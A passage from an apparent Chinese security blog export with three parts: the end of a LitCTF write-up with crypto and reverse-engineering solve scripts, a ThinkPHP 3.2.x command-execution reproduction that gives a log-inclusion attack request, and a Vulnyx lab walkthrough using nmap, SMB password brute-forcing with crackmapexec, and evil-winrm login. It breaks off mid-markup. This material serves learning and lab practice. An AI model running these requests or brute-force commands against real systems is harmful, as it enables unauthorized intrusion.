<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">93492332457019255141294502555555489582661562346262162342211605562996217352449</span>
q<span class="token operator">=</span><span class="token number">102846375519753428570573823986925744957687092615041080268232889119455234034483</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
e<span class="token operator">=</span><span class="token number">65537</span>
phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
c2<span class="token operator">=</span> <span class="token number">3784701757181065428915597927276042180461070890549646164035543821266506371502690247347168340234933318004928718562990468281285421981157783991138077081303219</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;R1ght_Answ3r!&#125;'</span></code></pre>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="编码喵"><a href="#编码喵" class="headerlink" title="编码喵"></a>编码喵</h3><p>换表base64<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdk3l.webp" alt="OJdk3l.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/04/OJdzig.webp" alt="OJdzig.webp" loading="lazy"></p>
<h3 id="hello-upx"><a href="#hello-upx" class="headerlink" title="hello_upx"></a>hello_upx</h3><p>upx脱壳010打开发现upx都被改成小写，手动改回大写<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdF4B.webp" alt="OJdF4B.webp" loading="lazy"><br>upx -d 脱壳成功<br><img src="https://ooo.0x0.ooo/2024/06/04/OJdh2s.webp" alt="OJdh2s.webp" loading="lazy"><br>写个逆向脚本拿到flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse_engineer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x707541504072684C</span><span class="token punctuation">,</span> <span class="token number">0x655158612559632B</span><span class="token punctuation">,</span> <span class="token number">0x4F5E4E601E5A4E20</span><span class="token punctuation">]</span>
    bytes_sequence <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> num <span class="token keyword">in</span> v4<span class="token punctuation">:</span>
        bytes_sequence<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>num<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sequence <span class="token operator">=</span> bytes_sequence<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">]</span>
    flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>byte <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> byte <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>sequence<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"The flag is: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
reverse_engineer<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;w3lc0me_t0_l1tctf&#125;</span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Crypto</tag>
        <tag>Re</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp3.2.x命令执行</title>
    <url>/posts/dcc68ae8/</url>
    <content><![CDATA[<p><img src="https://ooo.0x0.ooo/2024/05/15/OJ74Yq.png" alt="OJ74Yq.png" loading="lazy"></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>本漏洞利用的条件是assign方法的第一个变量可控，在TP3.2.2框架中，如果要在模板中输出变量，需要控制器中把变量传递给模板，系统提供了assign方法对模板变量赋值。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="https://ooo.0x0.ooo/2024/05/15/OJ7LAr.png" alt="OJ7LAr.png" loading="lazy"><br>将代码注入到日志中</p>
<pre class="language-none"><code class="language-none">构造攻击请求：
http:&#x2F;&#x2F;ip&#x2F;index.php?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;24_05_15.log</code></pre>
<p><code>/Application/Runtime/Logs/Common/24_05_15.log</code>是默认配置的日志目录m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index是路由访问的普通模式<br>四种模式:</p>
<ol>
<li><p>普通模式</p>
<blockquote>
<p><a href="http://localhost/index.php?m=Home&c=Index&f=index&name=Sn0w">http://localhost/index.php?m=Home&amp;c=Index&amp;f=index&amp;name=Sn0w</a><br>http:&#x2F;&#x2F;网址&#x2F;index.php?m&#x3D;模块名称&amp;c&#x3D;控制器&amp;a&#x3D;方法</p>
</blockquote>
</li>
<li><p>兼容模式</p>
<blockquote>
<p><a href="http://localhost/index.php?s=Home/Index/index/name/Sn0w">http://localhost/index.php?s=Home/Index/index/name/Sn0w</a><br>http:&#x2F;&#x2F;网址&#x2F;index.php?s&#x3D;&#x2F;模块&#x2F;控制器&#x2F;方法</p>
</blockquote>
</li>
<li><p>REWRITE模式</p>
<blockquote>
<p><a href="http://localhost/Home/Index/index/name/Sn0w/">http://localhost/Home/Index/index/name/Sn0w/</a><br>http:&#x2F;&#x2F;网址&#x2F;模块&#x2F;控制器&#x2F;操作方法</p>
</blockquote>
</li>
<li><p>PATHINFO模式</p>
<blockquote>
<p><a href="http://localhost/index.php/Home/Index/index/name/Sn0w/">http://localhost/index.php/Home/Index/index/name/Sn0w/</a><br>http:&#x2F;&#x2F;网址&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作方法</p>
</blockquote>
</li>
</ol>
<p><img src="https://ooo.0x0.ooo/2024/05/15/OJ7ESM.png" alt="OJ7ESM.png" loading="lazy"><br>成功命令执行<br>细节分析可参考<a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a></p>
]]></content>
      <categories>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnyx-Admin</title>
    <url>/posts/20dbae8a/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.201</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:84:5b:38       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.201  08:00:27:34:48:f9       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T5</span> <span class="token number">192.168</span>.56.201
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-18 <span class="token number">15</span>:13 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.201
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0017s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65521</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-title: IIS Windows
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5040</span>/tcp  <span class="token function">open</span>  unknown
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:34:48:F9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose<span class="token operator">|</span>media device
Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">10</span><span class="token operator">|</span><span class="token number">2019</span><span class="token operator">|</span>Longhorn<span class="token operator">|</span><span class="token number">2008</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span><span class="token number">11</span><span class="token operator">|</span>Vista<span class="token operator">|</span>XP <span class="token punctuation">(</span><span class="token number">99</span>%<span class="token punctuation">)</span>, Microsoft embedded <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_xp::sp3 cpe:/h:microsoft:xbox_one
Aggressive OS guesses: Microsoft Windows <span class="token number">10</span> <span class="token number">1709</span> - <span class="token number">1909</span> <span class="token punctuation">(</span><span class="token number">99</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1709</span> - <span class="token number">1803</span> <span class="token punctuation">(</span><span class="token number">96</span>%<span class="token punctuation">)</span>, Microsoft Windows Longhorn <span class="token punctuation">(</span><span class="token number">94</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1703</span> <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1809</span> - <span class="token number">2004</span> <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">10</span> <span class="token number">1511</span> <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2008</span> SP2 <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">7</span> SP1 <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">8</span> <span class="token punctuation">(</span><span class="token number">93</span>%<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-18T13:18:24
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: 5h59m57s
<span class="token operator">|</span>_nbstat: NetBIOS name: ADMIN, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:34:48:f9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.71</span> ms <span class="token number">192.168</span>.56.201</code></pre>
<p>发现存在web界面<br><img src="https://ooo.0x0.ooo/2024/07/18/ORnexD.png" alt="ORnexD.png" loading="lazy"><br>还是个IIS的中间件，啥也别说了，扫下目录</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.201 <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.201
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              php,bak,zip,html,txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/tasks.txt            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">98</span><span class="token punctuation">]</span>
/Tasks.txt            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">98</span><span class="token punctuation">]</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/18/ORnvZb.png" alt="ORnvZb.png" loading="lazy"><br>列了一些任务，但是没啥用，给了一个用户名<code>hope</code>，尝试密码爆破</p>
<h2 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h2><p>第一遍用<code>crackmapexec</code>，爆破的时候爆出一个密码<code>loser</code>，但是没看清，再扫一次用户就被锁定了0.0,我重置了一下靶机，靶机ip变成了192.168.56.202</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.201 <span class="token parameter variable">-u</span> hope <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt 
SMB         <span class="token number">192.168</span>.56.201  <span class="token number">445</span>    ADMIN            <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">19041</span> x64 <span class="token punctuation">(</span>name:ADMIN<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:ADMIN<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.56.201  <span class="token number">445</span>    ADMIN            <span class="token punctuation">[</span>-<span class="token punctuation">]</span> ADMIN<span class="token punctuation">\</span>hope:loser STATUS_ACCOUNT_LOCKED_OUT </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.202 <span class="token parameter variable">-u</span> hope <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt
SMB         <span class="token number">192.168</span>.56.202  <span class="token number">445</span>    ADMIN            <span class="token punctuation">[</span>+<span class="token punctuation">]</span> ADMIN<span class="token punctuation">\</span>hope:loser </code></pre>
<p>看一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbmap <span class="token parameter variable">-H</span>  <span class="token number">192.168</span>.56.202 <span class="token parameter variable">-u</span> hope <span class="token parameter variable">-p</span> loser

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                                
                                                                                                    
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.56.202:445      Name: <span class="token number">192.168</span>.56.202            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota</code></pre>
<p>没什么用，没有域，也不用找sid了</p>
<h2 id="winrm登录"><a href="#winrm登录" class="headerlink" title="winrm登录"></a>winrm登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.202 <span class="token parameter variable">-u</span> hope <span class="token parameter variable">-p</span> loser
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
admin<span class="token punctuation">\</span>hope</code></pre>
<p>winrm可以登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          <span class="token number">7</span>/3/2024   <span class="token number">9</span>:42 PM             <span class="token number">70</span> user.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> user.txt
aacd4aebb5743ba45d3b4591ac03ace1</code></pre>
<p>拿到user flag</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>hope<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">whoami</span> /all

INFORMACIàN DE USUARIO
----------------------

Nombre de usuario SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
admin<span class="token punctuation">\</span>hope        S-1-5-21-3084561998-2733067770-554905821-1001


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID          Atributos
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token 